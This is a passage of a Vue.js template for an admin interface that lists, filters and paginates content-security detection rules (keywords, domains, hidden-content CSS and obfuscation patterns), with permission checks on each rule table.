              <!-- Severity Filter -->
              <select 
                v-model="keywordSeverity"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Severities</option>
                <option value="CRITICAL">Critical</option>
                <option value="HIGH">High</option>
                <option value="MEDIUM">Medium</option>
                <option value="LOW">Low</option>
                <option value="INFO">Info</option>
              </select>

              <!-- Match Type Filter -->
              <select 
                v-model="keywordMatchType"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Match Types</option>
                <option value="SUBSTRING">Substring</option>
                <option value="WORD">Word</option>
              </select>

              <!-- Is Active Filter -->
              <select 
                v-model="keywordIsActive"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Active Status</option>
                <option value="true">Active Only</option>
                <option value="false">Inactive Only</option>
              </select>

              <!-- Is Enabled Filter -->
              <select 
                v-model="keywordIsEnabled"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Enabled Status</option>
                <option value="true">Enabled Only</option>
                <option value="false">Disabled Only</option>
              </select>

              <!-- Ordering Filter -->
              <select 
                v-model="keywordOrdering"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="-created_at">Newest First</option>
                <option value="created_at">Oldest First</option>
                <option value="keyword">Keyword (A-Z)</option>
                <option value="-keyword">Keyword (Z-A)</option>
              </select>

              <!-- Page Size Selector -->
              <div class="flex items-center gap-1.5 border-l border-border pl-2.5 shrink-0">
                <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                <select 
                  v-model="keywordPageSize"
                  class="h-9 px-2 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option :value="5">5 / page</option>
                  <option :value="10">10 / page</option>
                  <option :value="25">25 / page</option>
                  <option :value="50">50 / page</option>
                  <option :value="100">100 / page</option>
                </select>
              </div>

              <!-- Reset Button -->
              <button 
                v-if="keywordSearchQuery || keywordCategory !== 'all' || keywordSeverity !== 'all' || keywordMatchType !== 'all' || keywordIsActive !== 'all' || keywordIsEnabled !== 'all'"
                @click="resetKeywordFilters"
                class="h-9 px-3 text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted rounded-lg transition-colors shrink-0"
                title="Reset keyword filters"
              >
                Reset
              </button>
            </div>
          </div>
        </div>

        <!-- Keyword Rules Table Wrapper -->
        <div v-if="!canViewKeywords" class="p-8 text-center text-rose-500 bg-rose-500/5 border border-rose-500/20 rounded-2xl space-y-2">
          <ShieldAlert class="w-8 h-8 mx-auto text-rose-500" />
          <p class="text-sm font-semibold">Access Denied</p>
          <p class="text-xs text-muted-foreground">You do not have permission to view content security keyword rules.</p>
        </div>
        <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
          <!-- Loading state -->
          <div v-if="isKeywordsLoading" class="p-12 text-center space-y-3">
            <RefreshCw class="w-8 h-8 animate-spin mx-auto text-primary" />
            <p class="text-xs text-muted-foreground">Loading keyword rules from security registry...</p>
          </div>
          <!-- Error state -->
          <div v-else-if="keywordsError" class="p-12 text-center space-y-3 text-rose-500">
            <ShieldAlert class="w-8 h-8 mx-auto" />
            <p class="text-sm font-semibold">Failed to Retrieve Keyword Rules</p>
            <p class="text-xs text-muted-foreground">{{ keywordsError }}</p>
            <UiButton size="sm" @click="fetchKeywordRules" class="mt-2">Retry</UiButton>
          </div>
          <!-- Table state -->
          <div v-else>
            <UiTable 
              :columns="keywordRuleColumns" 
              :data="keywordRulesData"
              empty-text="No keyword rules found"
              empty-description="No items match your active rules query."
            >
              <!-- Keyword Cell -->
              <template #cell-keyword="{ item }">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ item.keyword }}
                </span>
              </template>

              <!-- Category Cell -->
              <template #cell-category="{ item }">
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ item.category }}
                </span>
              </template>

              <!-- Match Type Cell -->
              <template #cell-match_type="{ item }">
                <span class="px-2 py-0.5 rounded bg-muted text-[11px] font-mono text-muted-foreground border border-border/50">
                  {{ item.match_type }}
                </span>
              </template>

              <!-- Severity Cell -->
              <template #cell-severity="{ item }">
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                  {{ item.severity }}
                </span>
              </template>

              <!-- Enabled Cell -->
              <template #cell-is_enabled="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_enabled 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                </span>
              </template>

              <!-- Active Cell -->
              <template #cell-is_active="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_active 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                </span>
              </template>

              <!-- Created At Cell -->
              <template #cell-created_at="{ item }">
                <span class="text-xs text-muted-foreground font-mono">
                  {{ formatDate(item.created_at) }}
                </span>
              </template>

              <!-- Actions Cell -->
              <template #cell-actions="{ item }">
                <div class="flex items-center justify-end gap-1.5">
                  <button 
                    v-if="canViewKeywords"
                    @click.stop="openKeywordViewModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="View keyword rule details"
                    aria-label="View keyword rule details"
                  >
                    <Eye class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canEditKeywordRule"
                    @click.stop="openEditKeywordRuleModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="Edit keyword rule"
                    aria-label="Edit keyword rule"
                  >
                    <Edit3 class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canDeleteKeywordRule"
                    @click.stop="openDeleteKeywordRuleModal(item)"
                    class="p-1.5 rounded-lg text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors cursor-pointer"
                    title="Delete keyword rule"
                    aria-label="Delete keyword rule"
                  >
                    <Trash2 class="w-4 h-4" />
                  </button>
                </div>
              </template>
            </UiTable>

            <!-- Pagination Controls -->
            <UiPagination 
              v-if="keywordRulesCount > 0"
              :current-page="keywordPage"
              :total-pages="keywordRulesPages"
              :total-count="keywordRulesCount"
              :items-per-page="keywordPageSize"
              item-label="keyword rules"
              @update:current-page="keywordPage = $event"
            />
          </div>
        </div>
      </div>

      <!-- Domains Subtab Specific Filters & Table -->
      <div v-else-if="rulesSubTab === 'domains'" class="space-y-4">
        <!-- Domain Rules Filters Toolbar -->
        <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
          <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
            <!-- Search Box -->
            <div class="relative flex-1">
              <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input 
                v-model="domainSearchQuery"
                type="text" 
                placeholder="Search domains..." 
                class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-lg text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
              />
              <button 
                v-if="domainSearchQuery" 
                @click="domainSearchQuery = ''"
                class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                <X class="w-3.5 h-3.5" />
              </button>
            </div>

            <!-- Filters Dropdowns Row -->
            <div class="flex items-center gap-2 flex-wrap lg:flex-nowrap">
              <!-- Category Filter -->
              <select 
                v-model="domainCategory"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Categories</option>
                <option value="ADULT">Adult</option>
                <option value="DRUG">Drug</option>
                <option value="GAMBLING">Gambling</option>
                <option value="HIDDEN_CONTENT">Hidden Content</option>
                <option value="INJECTION">Injection</option>
                <option value="MALWARE">Malware</option>
                <option value="OBFUSCATION">Obfuscation</option>
                <option value="PHISHING">Phishing</option>
                <option value="REDIRECT">Redirect</option>
                <option value="SCAM">Scam</option>
                <option value="SPAM">Spam</option>
              </select>

              <!-- Severity Filter -->
              <select 
                v-model="domainSeverity"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Severities</option>
                <option value="CRITICAL">Critical</option>
                <option value="HIGH">High</option>
                <option value="MEDIUM">Medium</option>
                <option value="LOW">Low</option>
                <option value="INFO">Info</option>
              </select>

              <!-- Match Type Filter -->
              <select 
                v-model="domainMatchType"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Match Types</option>
                <option value="EXACT">Exact Domain</option>
                <option value="SUBDOMAIN">Domain And Subdomains</option>
              </select>

              <!-- Is Active Filter -->
              <select 
                v-model="domainIsActive"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Active Status</option>
                <option value="true">Active Only</option>
                <option value="false">Inactive Only</option>
              </select>

              <!-- Is Enabled Filter -->
              <select 
                v-model="domainIsEnabled"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Enabled Status</option>
                <option value="true">Enabled Only</option>
                <option value="false">Disabled Only</option>
              </select>

              <!-- Ordering Filter -->
              <select 
                v-model="domainOrdering"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="-created_at">Newest First</option>
                <option value="created_at">Oldest First</option>
                <option value="domain">Domain (A-Z)</option>
                <option value="-domain">Domain (Z-A)</option>
              </select>

              <!-- Page Size Selector -->
              <div class="flex items-center gap-1.5 border-l border-border pl-2.5 shrink-0">
                <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                <select 
                  v-model="domainPageSize"
                  class="h-9 px-2 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option :value="5">5 / page</option>
                  <option :value="10">10 / page</option>
                  <option :value="25">25 / page</option>
                  <option :value="50">50 / page</option>
                  <option :value="100">100 / page</option>
                </select>
              </div>

              <!-- Reset Button -->
              <button 
                v-if="domainSearchQuery || domainCategory !== 'all' || domainSeverity !== 'all' || domainMatchType !== 'all' || domainIsActive !== 'all' || domainIsEnabled !== 'all'"
                @click="resetDomainFilters"
                class="h-9 px-3 text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted rounded-lg transition-colors shrink-0"
                title="Reset domain filters"
              >
                Reset
              </button>
            </div>
          </div>
        </div>

        <!-- Domain Rules Table Wrapper -->
        <div v-if="!canViewDomains" class="p-8 text-center text-rose-500 bg-rose-500/5 border border-rose-500/20 rounded-2xl space-y-2">
          <ShieldAlert class="w-8 h-8 mx-auto text-rose-500" />
          <p class="text-sm font-semibold">Access Denied</p>
          <p class="text-xs text-muted-foreground">You do not have permission to view content security domain rules.</p>
        </div>
        <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
          <!-- Loading state -->
          <div v-if="isDomainsLoading" class="p-12 text-center space-y-3">
            <RefreshCw class="w-8 h-8 animate-spin mx-auto text-primary" />
            <p class="text-xs text-muted-foreground">Loading domain rules from security registry...</p>
          </div>
          <!-- Error state -->
          <div v-else-if="domainsError" class="p-12 text-center space-y-3 text-rose-500">
            <ShieldAlert class="w-8 h-8 mx-auto" />
            <p class="text-sm font-semibold">Failed to Retrieve Domain Rules</p>
            <p class="text-xs text-muted-foreground">{{ domainsError }}</p>
            <UiButton size="sm" @click="fetchDomainRules" class="mt-2">Retry</UiButton>
          </div>
          <!-- Table state -->
          <div v-else>
            <UiTable 
              :columns="domainRuleColumns" 
              :data="domainRulesData"
              empty-text="No domain rules found"
              empty-description="No items match your active rules query."
            >
              <!-- Domain Cell -->
              <template #cell-domain="{ item }">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ item.domain }}
                </span>
              </template>

              <!-- Category Cell -->
              <template #cell-category="{ item }">
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ item.category }}
                </span>
              </template>

              <!-- Match Type Cell -->
              <template #cell-match_type="{ item }">
                <span class="px-2 py-0.5 rounded bg-muted text-[11px] font-mono text-muted-foreground border border-border/50">
                  {{ item.match_type }}
                </span>
              </template>

              <!-- Severity Cell -->
              <template #cell-severity="{ item }">
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                  {{ item.severity }}
                </span>
              </template>

              <!-- Enabled Cell -->
              <template #cell-is_enabled="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_enabled 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                </span>
              </template>

              <!-- Active Cell -->
              <template #cell-is_active="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_active 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                </span>
              </template>

              <!-- Created At Cell -->
              <template #cell-created_at="{ item }">
                <span class="text-xs text-muted-foreground font-mono">
                  {{ formatDate(item.created_at) }}
                </span>
              </template>

              <!-- Actions Cell -->
              <template #cell-actions="{ item }">
                <div class="flex items-center justify-end gap-1.5">
                  <button 
                    v-if="canViewDomains"
                    @click.stop="openDomainViewModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="View domain rule details"
                    aria-label="View domain rule details"
                  >
                    <Eye class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canEditDomainRule"
                    @click.stop="openEditDomainRuleModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="Edit domain rule"
                    aria-label="Edit domain rule"
                  >
                    <Edit3 class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canDeleteDomainRule"
                    @click.stop="openDeleteDomainRuleModal(item)"
                    class="p-1.5 rounded-lg text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors cursor-pointer"
                    title="Delete domain rule"
                    aria-label="Delete domain rule"
                  >
                    <Trash2 class="w-4 h-4" />
                  </button>
                </div>
              </template>
            </UiTable>

            <!-- Pagination Controls -->
            <UiPagination 
              v-if="domainRulesCount > 0"
              :current-page="domainPage"
              :total-pages="domainRulesPages"
              :total-count="domainRulesCount"
              :items-per-page="domainPageSize"
              item-label="domain rules"
              @update:current-page="domainPage = $event"
            />
          </div>
        </div>
      </div>

      <!-- Hidden Content Subtab Specific Filters & Table -->
      <div v-else-if="rulesSubTab === 'hidden_content'" class="space-y-4">
        <!-- Hidden Content Rules Filters Toolbar -->
        <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
          <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
            <!-- Search Box -->
            <div class="relative flex-1">
              <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input 
                v-model="hiddenContentSearchQuery" 
                type="text" 
                placeholder="Search hidden content rules (e.g. display:none, opacity:0)..." 
                class="w-full h-9 pl-9 pr-8 bg-background border border-input rounded-xl text-xs font-medium text-foreground placeholder:text-muted-foreground outline-none focus:ring-2 focus:ring-ring/20 focus:border-ring transition-all"
              />
              <button 
                v-if="hiddenContentSearchQuery" 
                @click="hiddenContentSearchQuery = ''"
                class="absolute right-2.5 top-1/2 -translate-y-1/2 p-0.5 text-muted-foreground hover:text-foreground rounded cursor-pointer"
                title="Clear search"
              >
                <X class="w-3.5 h-3.5" />
              </button>
            </div>

            <!-- Filter Controls -->
            <div class="flex items-center gap-2 flex-wrap sm:flex-nowrap">
              <!-- Category Filter -->
              <select 
                v-model="hiddenContentCategory"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Categories</option>
                <option value="ADULT">Adult</option>
                <option value="DRUG">Drug</option>
                <option value="GAMBLING">Gambling</option>
                <option value="HIDDEN_CONTENT">Hidden Content</option>
                <option value="INJECTION">Injection</option>
                <option value="MALWARE">Malware</option>
                <option value="OBFUSCATION">Obfuscation</option>
                <option value="PHISHING">Phishing</option>
                <option value="REDIRECT">Redirect</option>
                <option value="SCAM">Scam</option>
                <option value="SPAM">Spam</option>
              </select>

              <!-- Severity Filter -->
              <select 
                v-model="hiddenContentSeverity"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Severities</option>
                <option value="CRITICAL">Critical</option>
                <option value="HIGH">High</option>
                <option value="MEDIUM">Medium</option>
                <option value="LOW">Low</option>
                <option value="INFO">Info</option>
              </select>

              <!-- Active Filter -->
              <select 
                v-model="hiddenContentIsActive"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Active Status</option>
                <option value="true">Active Only</option>
                <option value="false">Inactive Only</option>
              </select>

              <!-- Enabled Filter -->
              <select 
                v-model="hiddenContentIsEnabled"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Enabled Status</option>
                <option value="true">Enabled Only</option>
                <option value="false">Disabled Only</option>
              </select>

              <!-- Ordering Filter -->
              <select 
                v-model="hiddenContentOrdering"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="-created_at">Newest First</option>
                <option value="created_at">Oldest First</option>
                <option value="pattern">Pattern (A-Z)</option>
                <option value="-pattern">Pattern (Z-A)</option>
              </select>

              <!-- Page Size Selector -->
              <div class="flex items-center gap-1.5 border-l border-border pl-2">
                <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                <select 
                  v-model.number="hiddenContentPageSize"
                  class="h-9 px-2 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option :value="5">5 / page</option>
                  <option :value="10">10 / page</option>
                  <option :value="25">25 / page</option>
                  <option :value="50">50 / page</option>
                  <option :value="100">100 / page</option>
                </select>
              </div>

              <!-- Reset Filters -->
              <button 
                v-if="hiddenContentSearchQuery || hiddenContentCategory !== 'all' || hiddenContentSeverity !== 'all' || hiddenContentIsActive !== 'all' || hiddenContentIsEnabled !== 'all' || hiddenContentOrdering !== '-created_at'"
                @click="resetHiddenContentFilters"
                class="h-9 px-2.5 rounded-xl text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted transition-colors flex items-center gap-1 cursor-pointer shrink-0"
                title="Reset all filters"
              >
                <RotateCcw class="w-3.5 h-3.5" />
                <span class="hidden sm:inline">Reset</span>
              </button>
            </div>
          </div>
        </div>

        <!-- Permission Check Guard -->
        <div v-if="!canViewHiddenContent" class="p-8 text-center text-rose-500 bg-rose-500/5 border border-rose-500/20 rounded-2xl space-y-2">
          <ShieldAlert class="w-8 h-8 mx-auto text-rose-500" />
          <p class="text-sm font-semibold">Access Denied</p>
          <p class="text-xs text-muted-foreground">You do not have permission to view content security hidden content rules.</p>
        </div>

        <!-- Table Container -->
        <div v-else class="space-y-4">
          <!-- Loading State -->
          <div v-if="isHiddenContentLoading" class="p-12 text-center bg-card border border-border rounded-2xl">
            <RefreshCw class="w-8 h-8 animate-spin mx-auto text-primary" />
            <p class="text-sm font-semibold text-foreground mt-3">Loading hidden content rules...</p>
            <p class="text-xs text-muted-foreground">Querying detection rules from database</p>
          </div>

          <!-- Error State -->
          <div v-else-if="hiddenContentError" class="p-8 text-center bg-rose-500/10 border border-rose-500/30 rounded-2xl space-y-3">
            <ShieldAlert class="w-8 h-8 mx-auto text-rose-600 dark:text-rose-400" />
            <div class="space-y-1">
              <h4 class="text-sm font-bold text-rose-700 dark:text-rose-300">Failed to Load Hidden Content Rules</h4>
              <p class="text-xs text-rose-600 dark:text-rose-400">{{ hiddenContentError }}</p>
            </div>
            <UiButton size="sm" variant="outline" @click="fetchHiddenContentRules" class="border-rose-500/40 hover:bg-rose-500/10">
              <RefreshCw class="w-3.5 h-3.5 mr-1.5" />
              <span>Retry</span>
            </UiButton>
          </div>

          <!-- Real Data Table -->
          <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
            <UiTable 
              :data="hiddenContentRulesData" 
              :columns="hiddenContentRuleColumns"
              empty-message="No hidden content rules match your filters."
            >
              <!-- CSS Declaration / Pattern Cell -->
              <template #cell-pattern="{ item }">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ item.pattern }}
                </span>
              </template>

              <!-- Category Cell -->
              <template #cell-category="{ item }">
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ item.category }}
                </span>
              </template>

              <!-- Severity Cell -->
              <template #cell-severity="{ item }">
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                  {{ item.severity }}
                </span>
              </template>

              <!-- Enabled Cell -->
              <template #cell-is_enabled="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_enabled 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                </span>
              </template>

              <!-- Active Cell -->
              <template #cell-is_active="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_active 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                </span>
              </template>

              <!-- Created At Cell -->
              <template #cell-created_at="{ item }">
                <span class="text-xs text-muted-foreground font-mono">
                  {{ formatDate(item.created_at) }}
                </span>
              </template>

              <!-- Actions Cell -->
              <template #cell-actions="{ item }">
                <div class="flex items-center justify-end gap-1.5">
                  <button 
                    v-if="canViewHiddenContent"
                    @click.stop="openHiddenContentViewModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="View hidden content rule details"
                    aria-label="View hidden content rule details"
                  >
                    <Eye class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canEditHiddenContentRule"
                    @click.stop="openEditHiddenContentRuleModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="Edit hidden content rule"
                    aria-label="Edit hidden content rule"
                  >
                    <Edit3 class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canDeleteHiddenContentRule"
                    @click.stop="openDeleteHiddenContentRuleModal(item)"
                    class="p-1.5 rounded-lg text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors cursor-pointer"
                    title="Delete hidden content rule"
                    aria-label="Delete hidden content rule"
                  >
                    <Trash2 class="w-4 h-4" />
                  </button>
                </div>
              </template>
            </UiTable>

            <!-- Pagination Controls -->
            <UiPagination 
              v-if="hiddenContentRulesCount > 0"
              :current-page="hiddenContentPage"
              :total-pages="hiddenContentRulesPages"
              :total-count="hiddenContentRulesCount"
              :items-per-page="hiddenContentPageSize"
              item-label="hidden content rules"
              @update:current-page="hiddenContentPage = $event"
            />
          </div>
        </div>
      </div>

      <!-- Obfuscation Subtab Specific Filters & Table -->
      <div v-else-if="rulesSubTab === 'obfuscation'" class="space-y-4">
        <!-- Obfuscation Rules Filters Toolbar -->
        <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
          <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
            <!-- Search Box -->
            <div class="relative flex-1">
              <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input 
                v-model="obfuscationSearchQuery" 
                type="text" 
                placeholder="Search obfuscation rules (e.g. eval, base64, fromCharCode)..." 
                class="w-full h-9 pl-9 pr-8 bg-background border border-input rounded-xl text-xs font-medium text-foreground placeholder:text-muted-foreground outline-none focus:ring-2 focus:ring-ring/20 focus:border-ring transition-all"
              />
              <button 
                v-if="obfuscationSearchQuery" 
                @click="obfuscationSearchQuery = ''"
                class="absolute right-2.5 top-1/2 -translate-y-1/2 p-0.5 text-muted-foreground hover:text-foreground rounded cursor-pointer"
                title="Clear search"
              >
                <X class="w-3.5 h-3.5" />
              </button>
            </div>

            <!-- Filter Controls -->
            <div class="flex items-center gap-2 flex-wrap sm:flex-nowrap">
              <!-- Category Filter -->
              <select 
                v-model="obfuscationCategory"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Categories</option>
                <option value="ADULT">Adult</option>
                <option value="DRUG">Drug</option>
                <option value="GAMBLING">Gambling</option>
                <option value="HIDDEN_CONTENT">Hidden Content</option>
                <option value="INJECTION">Injection</option>
                <option value="MALWARE">Malware</option>
                <option value="OBFUSCATION">Obfuscation</option>
                <option value="PHISHING">Phishing</option>
                <option value="REDIRECT">Redirect</option>
                <option value="SCAM">Scam</option>
                <option value="SPAM">Spam</option>
              </select>

              <!-- Severity Filter -->
              <select 
                v-model="obfuscationSeverity"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Severities</option>
                <option value="CRITICAL">Critical</option>
                <option value="HIGH">High</option>
                <option value="MEDIUM">Medium</option>
                <option value="LOW">Low</option>
                <option value="INFO">Info</option>
              </select>

              <!-- Active Filter -->
              <select 
                v-model="obfuscationIsActive"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Active Status</option>
                <option value="true">Active Only</option>
                <option value="false">Inactive Only</option>
              </select>

              <!-- Enabled Filter -->
              <select 
                v-model="obfuscationIsEnabled"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Enabled Status</option>
                <option value="true">Enabled Only</option>
                <option value="false">Disabled Only</option>
              </select>

              <!-- Ordering Filter -->
              <select 
                v-model="obfuscationOrdering"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="-created_at">Newest First</option>
                <option value="created_at">Oldest First</option>
                <option value="pattern">Pattern (A-Z)</option>
